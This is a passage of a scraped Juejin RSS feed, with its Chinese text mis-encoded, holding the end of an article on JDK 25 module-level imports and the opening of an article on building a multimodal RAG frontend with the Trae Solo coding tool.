    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨è‡ªå®šä¹‰æ¨¡å—å¯¼å‡ºåŒ…ä¸­çš„ç±»</span>
        StringUtils.trim(<span class="hljs-string">"  hello  "</span>);
        CollectionUtils.isEmpty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;());
    }
}
</code></pre>
<p>è¿™å¯¹äºå¤§å‹é¡¹ç›®çš„æ¨¡å—é—´è°ƒç”¨éå¸¸å‹å¥½ï¼Œæ— éœ€è®°å¿†æ¯ä¸ªå·¥å…·ç±»çš„å…·ä½“åŒ…è·¯å¾„ã€‚</p>
<h2 data-id="heading-13">å››ã€é¿å‘æŒ‡å—ï¼šæ¨¡å—çº§å¯¼å…¥çš„æ³¨æ„äº‹é¡¹</h2>
<p>è™½ç„¶æ¨¡å—çº§å¯¼å…¥å¾ˆæ–¹ä¾¿ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›éœ€è¦æ³¨æ„çš„â€œå‘â€ï¼Œæå‰äº†è§£èƒ½é¿å…è¸©é›·ã€‚</p>
<h3 data-id="heading-14">4.1 ä»…èƒ½å¯¼å…¥â€œå¯¼å‡ºçš„åŒ…â€</h3>
<p>æ¨¡å—çº§å¯¼å…¥åªèƒ½ä½¿ç”¨ç›®æ ‡æ¨¡å—<strong>æ˜ç¡®å¯¼å‡º</strong>çš„åŒ…ä¸­çš„ç±»ã€‚å¦‚æœæŸä¸ªæ¨¡å—çš„åŒ…æ²¡æœ‰ç”¨<code>exports</code>å£°æ˜ï¼Œå³ä½¿å¯¼å…¥äº†æ¨¡å—ï¼Œä¹Ÿæ— æ³•ä½¿ç”¨è¯¥åŒ…çš„ç±»ã€‚</p>
<p>ä¾‹å¦‚ï¼ŒJDKçš„<code>java.base</code>æ¨¡å—æ²¡æœ‰å¯¼å‡º<code>sun.misc</code>åŒ…ï¼ˆè¿™æ˜¯å†…éƒ¨åŒ…ï¼‰ï¼Œæ‰€ä»¥å³ä½¿å¯¼å…¥äº†<code>java.base</code>æ¨¡å—ï¼Œä¹Ÿæ— æ³•ç›´æ¥ä½¿ç”¨<code>sun.misc.Unsafe</code>ç±»â€”â€”è¿™å’Œä¼ ç»Ÿå¯¼å…¥çš„è§„åˆ™ä¸€è‡´ï¼Œæœ¬è´¨æ˜¯ä¿æŠ¤æ¨¡å—çš„å†…éƒ¨å®ç°ã€‚</p>
<h3 data-id="heading-15">4.2 ä¸å»ºè®®åœ¨å¤æ‚åœºæ™¯è¿‡åº¦ä½¿ç”¨</h3>
<p>åœ¨å¤§å‹æ¡†æ¶å¼€å‘ã€å¼€æºé¡¹ç›®æˆ–éœ€è¦ä¸¥æ ¼æ§åˆ¶ä¾èµ–çš„åœºæ™¯ä¸­ï¼Œä¸å»ºè®®è¿‡åº¦ä¾èµ–æ¨¡å—çº§å¯¼å…¥ã€‚å› ä¸ºè¿™ç±»åœºæ™¯éœ€è¦æ¸…æ™°çš„ä¾èµ–å…³ç³»ï¼Œç²¾ç¡®å¯¼å…¥èƒ½è®©ä»£ç çš„ä¾èµ–æ›´é€æ˜ï¼Œä¾¿äºåç»­çš„ç»´æŠ¤å’Œé‡æ„ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼šæ—¥å¸¸å¼€å‘ç”¨æ¨¡å—çº§å¯¼å…¥ææ•ˆï¼Œå¤æ‚é¡¹ç›®ç”¨ç²¾ç¡®å¯¼å…¥ä¿æ¸…æ™°ã€‚</p>
<h3 data-id="heading-16">4.3 IDEæ”¯æŒæ˜¯å‰æ</h3>
<p>ç›®å‰ï¼ŒIntelliJ IDEAã€Eclipseç­‰ä¸»æµIDEå·²é’ˆå¯¹JDK 25çš„æ¨¡å—çº§å¯¼å…¥ç‰¹æ€§æä¾›äº†æ”¯æŒï¼Œä½†éœ€è¦å°†é¡¹ç›®çš„JDKç‰ˆæœ¬åˆ‡æ¢åˆ°JDK 25åŠä»¥ä¸Šï¼Œå¹¶åœ¨IDEè®¾ç½®ä¸­å¯ç”¨ç›¸å…³ç‰¹æ€§ã€‚å¦‚æœä½¿ç”¨æ—§ç‰ˆæœ¬IDEï¼Œå¯èƒ½ä¼šå‡ºç°è¯­æ³•æŠ¥é”™ï¼ˆå³ä½¿ä»£ç èƒ½æ­£å¸¸ç¼–è¯‘è¿è¡Œï¼‰ã€‚</p>
<h2 data-id="heading-17">äº”ã€æ€»ç»“ï¼šJavaå¯¼å…¥æœºåˆ¶çš„è¿›åŒ–æ„ä¹‰</h2>
<p>ä»<code>java.lang</code>çš„é»˜è®¤å¯¼å…¥ï¼Œåˆ°é€šé…ç¬¦å¯¼å…¥ï¼Œå†åˆ°JDK 25çš„æ¨¡å—çº§å¯¼å…¥ï¼ŒJavaçš„å¯¼å…¥æœºåˆ¶ä¸€ç›´åœ¨æœç€â€œç®€æ´ã€é«˜æ•ˆâ€çš„æ–¹å‘è¿›åŒ–ã€‚JEP 511å¸¦æ¥çš„æ¨¡å—çº§å¯¼å…¥ï¼Œæœ¬è´¨ä¸Šæ˜¯Javaæ¨¡å—ç³»ç»Ÿçš„è¿›ä¸€æ­¥è½åœ°â€”â€”å®ƒä¸ä»…è§£å†³äº†ä¼ ç»Ÿå¯¼å…¥çš„è‡ƒè‚¿é—®é¢˜ï¼Œæ›´è®©å¼€å‘è€…ä»â€œå…³æ³¨åŒ…â€è½¬å‘â€œå…³æ³¨æ¨¡å—â€ï¼Œè¿™ä¸ç°ä»£ç¼–ç¨‹è¯­è¨€çš„è®¾è®¡ç†å¿µï¼ˆå¦‚Pythonçš„æ¨¡å—ã€Goçš„åŒ…ï¼‰æ¥è½¨ã€‚</p>
<p>å¯¹äºå¼€å‘è€…è€Œè¨€ï¼Œè¿™ä¸ªç‰¹æ€§çš„ä»·å€¼åœ¨äºï¼š</p>
<ul>
<li>
<p>æ–°æ‰‹ï¼šé™ä½å…¥é—¨é—¨æ§›ï¼Œä¸ç”¨å†æ­»è®°ç¡¬èƒŒç±»çš„åŒ…è·¯å¾„ï¼›</p>
</li>
<li>
<p>ç†Ÿæ‰‹ï¼šå‡å°‘é‡å¤åŠ³åŠ¨ï¼Œè®©ä»£ç æ›´ç®€æ´ï¼Œä¸“æ³¨æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼›</p>
</li>
<li>
<p>å›¢é˜Ÿï¼šç»Ÿä¸€å¯¼å…¥è§„èŒƒï¼Œå‡å°‘å› å¯¼å…¥æ–¹å¼å¼•å‘çš„ä»£ç å†²çªã€‚</p>
</li>
</ul>
<p>å¦‚æœä½ å·²ç»å‡çº§åˆ°JDK 25ï¼Œä¸å¦¨åœ¨ä¸‹æ¬¡å¼€å‘ä¸­è¯•è¯•<code>import module java.base;</code>ï¼Œä½“éªŒä¸€ä¸‹â€œä¸€è¡Œå¯¼å…¥åƒä¸ªç±»â€çš„ä¾¿æ·ã€‚å½“ç„¶ï¼Œä¹Ÿåˆ«å¿˜äº†æ ¹æ®é¡¹ç›®åœºæ™¯çµæ´»æ­é…ç²¾ç¡®å¯¼å…¥ï¼Œè®©ä»£ç æ—¢ç®€æ´åˆæ¸…æ™°ã€‚</p>
<p>æœ€åï¼Œä½ è§‰å¾—æ¨¡å—çº§å¯¼å…¥èƒ½å½»åº•è§£å†³Javaçš„å¯¼å…¥ç—›ç‚¹å—ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„ä½¿ç”¨ä½“éªŒï¼</p>
<h2 data-id="heading-18">èµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenjdk.org%2Fjeps%2F511" target="_blank" title="https://openjdk.org/jeps/511" ref="nofollow noopener noreferrer">openjdk.org/jeps/511</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oracle.com%2Fnews%2Fannouncement%2Foracle-releases-java-25-2025-09-16%2F" target="_blank" title="https://www.oracle.com/news/announcement/oracle-releases-java-25-2025-09-16/" ref="nofollow noopener noreferrer">www.oracle.com/news/announâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆå››ï¼‰â€”â€”Trae Soloæ­å»ºéƒ¨ç½²å¤šæ¨¡æ€RAGå‰ç«¯(é™„AIç¼–ç¨‹å®è·µæŒ‡å—)]]></title>    <link>https://juejin.cn/post/7580723992498438180</link>    <guid>https://juejin.cn/post/7580723992498438180</guid>    <pubDate>2025-12-08T03:45:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580723992498438180" data-draft-id="7580389111920984127" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆå››ï¼‰â€”â€”Trae Soloæ­å»ºéƒ¨ç½²å¤šæ¨¡æ€RAGå‰ç«¯(é™„AIç¼–ç¨‹å®è·µæŒ‡å—)"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LangChain,Trae"/> <meta itemprop="datePublished" content="2025-12-08T03:45:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹çœŸå¥½ç©"/> <meta itemprop="url" content="https://juejin.cn/user/3140624091453053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆå››ï¼‰â€”â€”Trae Soloæ­å»ºéƒ¨ç½²å¤šæ¨¡æ€RAGå‰ç«¯(é™„AIç¼–ç¨‹å®è·µæŒ‡å—)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3140624091453053/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹çœŸå¥½ç©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:45:11.000Z" title="Mon Dec 08 2025 03:45:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»22åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¸Šç¯‡åˆ†äº«ã€Š<a href="https://juejin.cn/post/7577795545440960546" target="_blank" title="https://juejin.cn/post/7577795545440960546">LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆä¸‰ï¼‰â€”â€”å¤šæ¨¡æ€RAGç³»ç»ŸPDFè§£æåŠŸèƒ½å®ç°</a>ã€‹ä¸­ï¼Œç¬”è€…è¯¦ç»†åˆ†äº«äº†åŸºäº LangChain çš„å¤šæ¨¡æ€ RAG ç³»ç»Ÿå¦‚ä½•å¤„ç† PDF æ–‡æ¡£â€”â€”ä»è§£æã€æ–‡æœ¬åˆ†å—åˆ°å¼•ç”¨æº¯æºï¼Œå¹¶é€šè¿‡å®Œæ•´ä»£ç ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•å®ç°ä¸€ä¸ªå…·å¤‡æ–‡æ¡£å¼•ç”¨åŠŸèƒ½çš„é—®ç­”ç³»ç»Ÿï¼Œä¸ºå®é™…æ„å»ºå¤šæ¨¡æ€ RAG åº”ç”¨æä¾›äº†å…·ä½“æŒ‡å¯¼ã€‚</p>
<p>åç«¯æ ¸å¿ƒåŠŸèƒ½å·²åŸºæœ¬å¼€å‘å®Œæˆã€‚ä½†ä¸€ä¸ªå®Œæ•´çš„ç³»ç»Ÿç¦»ä¸å¼€ä¸ä¹‹åŒ¹é…çš„å‰ç«¯ç•Œé¢ã€‚åœ¨å½“å‰ AI ç¼–ç¨‹é€æ¸æˆä¸ºä¸»æµçš„èƒŒæ™¯ä¸‹ï¼ŒVibe Codingï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰æ­£æ·±åˆ»æ”¹å˜å¼€å‘æ–¹å¼ï¼šå¼€å‘è€…é€šè¿‡è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ï¼Œç”±å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ç›´æ¥ç”Ÿæˆè½¯ä»¶ã€‚åœ¨ç¬”è€…ä¹‹å‰çš„æ–‡ç« ã€Š<a href="https://juejin.cn/post/7574615024293429274" target="_blank" title="https://juejin.cn/post/7574615024293429274">Gemini3.0æ·±åº¦è§£æï¼Œå®ƒåœ¨é‡æ–°å®šä¹‰æ™ºèƒ½ï¼Œä¼šæ˜¯å‰ç«¯å·¥ç¨‹å¸ˆå™©æ¢¦å—ï¼Ÿ</a>ã€‹ä¸­æ›¾æ¢è®¨è¿‡è¿™ä¸€è¶‹åŠ¿ã€‚</p>
<p>Vibe Coding å·²ä¸å†æ˜¯å›½å¤–æ¨¡å‹çš„ä¸“å±ã€‚å­—èŠ‚è·³åŠ¨æ¨å‡ºçš„ AI ç¼–ç¨‹å·¥å…· <strong>Trae</strong> å·²å¼€æ”¾ Solo æ¨¡å¼ï¼Œå·ç§°èƒ½å¤Ÿé«˜æ•ˆã€è‡ªåŠ¨åŒ–åœ°å®ç°â€œä»è‡ªç„¶è¯­è¨€åˆ°è½¯ä»¶â€çš„å…¨æµTrae ç¨‹å¼€å‘ã€‚åœ¨æœ¬æœŸåˆ†äº«ä¸­ï¼Œç¬”è€…å°†å¸¦é¢†å¤§å®¶ä½¿ç”¨ Trae Soloï¼Œä¸€æ­¥æ­¥å®Œæˆå¤šæ¨¡æ€ RAG ç³»ç»Ÿå‰ç«¯é¡µé¢çš„æ­å»ºä¸å®ç°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/616d5f0a3be849da90afe8005003f1f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=uZP9oNyjHAWOSdp3bFs5zry%2F1Sk%3D" alt="6.png" loading="lazy"/></p>
